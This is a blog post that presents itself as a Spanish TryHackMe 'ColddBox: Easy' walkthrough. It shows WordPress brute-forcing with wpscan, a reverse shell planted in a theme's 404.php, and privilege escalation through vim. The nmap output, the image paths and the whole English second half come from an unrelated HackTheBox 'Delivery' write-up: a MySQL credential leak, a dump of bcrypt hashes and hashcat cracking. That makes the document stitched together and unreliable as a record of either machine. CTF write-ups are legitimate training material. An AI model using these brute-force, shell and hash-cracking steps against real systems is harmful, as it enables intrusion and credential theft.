---
layout: single
title: "ColddBox: Easy - TryHackMe"
excerpt: "ColddBox, tomalo como una empresa la cual dispone de sitio web como la gran mayoria. Nosotros como antiguos clientes de la empresa no estamos conformes con la atención proporcionada, entonces... es hora de utilizar nuestras habilidades de Hacking Etico para comprometer el sitio web."
date: 2025-08-14
classes: wide
header:
  teaser_home_page: true
  icon: /assets/images/thm.webp
categories:
  - TryHackMe
tags:  
  - Easy
  - WordPress
  - BruteForce
  - eJPTv2
  - PrivEsc
---

![](/assets/images/thm-writeup-colddbox/colddbox_logo.png)

Como hemos comentado antes, vamos a comprometer el servidor de ColddBox. En esta máquina usaremos técnicas de enumeración y ataques de fuerza bruta para extraer usuarios y contraseñas del panel de login, también modificaremos archivos para obtener una reverse shell del lado del servidor y acceder desde una shell interactiva. Para la escalada de privilegios nos bastará con una simple enumeración de binarios para comprobar sus permisos.

## Escaneo de puertos

```
Nmap scan report for 10.129.148.141
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Sun, 09 May 2021 00:00:02 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: fqrpd5m3ftgnzmxkbieezqadxo
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Sun, 09 May 2021 00:01:31 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Sun, 09 May 2021 00:01:31 GMT
|_    Content-Length: 0
```

## Página web

La web de ColddBox a primera vista no tiene nada que llame la atención, de todas formas estuve investigando cada apartado del sitio web.

![](/assets/images/htb-writeup-delivery/website1.png)

Podemos aplicar fuzzing para encontrar directorios ocultos, encontramos '/wp-admin' y '/hidden'.

![](/assets/images/htb-writeup-delivery/website2.png)

Accedemos a '/hidden' y encontramos 3 posibles usuarios que podríamos usar para hacer fuerza bruta posteriormente. La página señala que 'c0ldd' le ha cambiado la contraseña a 'Hugo', lo que da a entender que 'c0ldd' es un posible administrador.

![](/assets/images/htb-writeup-delivery/website2.png)

Accedemos a '/wp-admin' y probamos el usuario 'c0ldd' con una contraseña aleatoria, ya que si en WordPress ingresamos un usuario y ese usuario existe pero la contraseña es incorrecta nos va a decir que la contraseña es incorrecta, sin embargo, no dice nada del usuario. Si pusiesemos un usuario incorrecto y una contraseña incorrecta nos diría que el usuario y contraseña no son validos.

![](/assets/images/htb-writeup-delivery/mm1.png)

## WPScan - Fuerza bruta

Ya hemos encontrado un usuario por lo que no haría falta enumerar usuarios con la herrmamienta wpscan, en este caso con el comando `sudo wpscan -u http://10.10.10.10/ --username c0ldd -w /usr/share/wordlists/rockyou.txt
` aplicariamos fuerza bruta al usuario correspondiente y en cuestión de segundos nos reporta la contraseña del usuario.

![](/assets/images/htb-writeup-delivery/helpdesk3.png)

Ahora que tenemos las credenciales vamos a ingresarlas en el panel de login de WordPress.

![](/assets/images/htb-writeup-delivery/helpdesk1.png)

¡Bien! Ya estamos dentro del panel de administración del sitio web.

![](/assets/images/htb-writeup-delivery/helpdesk2.png)

Si desde el menú de la izquierda accedemos a '*Appearance*' y '*Editor*' nos salen una lista de archivos template.

![](/assets/images/htb-writeup-delivery/mm2.png)

Entre tantos archivos podemos encontrar un '404.php' el cual podemos tratar de explotar cambiando el contenido del archivo por una reverse shell de pentestmonkey.

![](/assets/images/htb-writeup-delivery/mm3.png)

Desde consola nos ponemos en escucha por el puerto que hayamos proporcionado anteriormente.

![](/assets/images/htb-writeup-delivery/mm4.png)

Ya tenemos todo preparado para obtener una shell inversa, desde el navegador ingresaremos al fichero .php cuyo contenido trae un payload, a este archivo se accede desde la ruta `10.10.10.10/wp-content/themes/twentyfifteen/404.php`.

![](/assets/images/htb-writeup-delivery/mm5.png)

Si se te queda cargando, vas por buen camino, no toques nada, ahora volvemos a la consola y podemos ver como ya estamos dentro del servidor.

![](/assets/images/htb-writeup-delivery/mm6.png)

Con el usuario en el que nos encontramos no tenemos privilegios ni si quiera para leer la primera flag.

![](/assets/images/htb-writeup-delivery/mm7.png)

Necesitamos escalar privilegios a 'c0ldd', investigando cada una de las carpetas y archivos encontramos un archivo de configuración de WordPress dentro de '/var/www/html/'. Si leemos el archivo wp-config.php vemos la contraseña del usuario 'c0ldd'.

![](/assets/images/htb-writeup-delivery/mm7.png)

Vamos a probar a acceder al otro usuario desde SSH.

![](/assets/images/htb-writeup-delivery/mm7.png)

Ahora ya estamos en otro usuario y podemos acceder a recursos que anteriormente no podiamos, vamos a leer la primera flag.

![](/assets/images/htb-writeup-delivery/mm7.png)

## Escalada de privilegios

Una vez hemos accedido a un usuario del sistema y conseguimos la flag de usuario, podemos ir a por el usuario root, podemos probar desde buscar permisos SUID a binarios con permisos SUDO.

![](/assets/images/htb-writeup-delivery/user.png)

Con `sudo -l` podemos ver que binarios o scripts podemos ejecutar como administrador, el problema es que hay algunos binarios que pueden ser explotados por un atacante.

![](/assets/images/htb-writeup-delivery/user.png)

Nos salen varios binarios, desde la web 'https://gtfobins.github.io/' podemos buscar cada binario y ver si son explotables, en este caso vamos a utilizar el binario VIM para escalar privilegios.

![](/assets/images/htb-writeup-delivery/user.png)

## Credentials in MySQL database

After doing some recon we find the MatterMost installation directory in `/opt/mattermost`:

```
maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
```

The `config.json` file contains the password for the MySQL database:

```
[...]
"SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
[...]
```

We'll connect to the database server and poke around.

```
maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 91
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
```

MatterMost user accounts are stored in the `Users` table and hashed with bcrypt. We'll save the hashes then try to crack them offline.

```
MariaDB [(none)]> use mattermost;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]> select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
8 rows in set (0.002 sec)
```

## Cracking with rules

There was a hint earlier that some variation of `PleaseSubscribe!` is used.

I'll use hashcat for this and since I don't know the hash ID for bcrypt by heart I can find it in the help.

```
C:\bin\hashcat>hashcat --help | findstr bcrypt
   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
```

My go-to rules is normally one of those two ruleset:

- [https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule](https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule)
- [https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)

These will perform all sort of transformations on the wordlist and we can quickly crack the password: `PleaseSubscribe!21`

```
C:\bin\hashcat>hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
[...]
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
[...]
```

The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag.

![](/assets/images/htb-writeup-delivery/root.png)
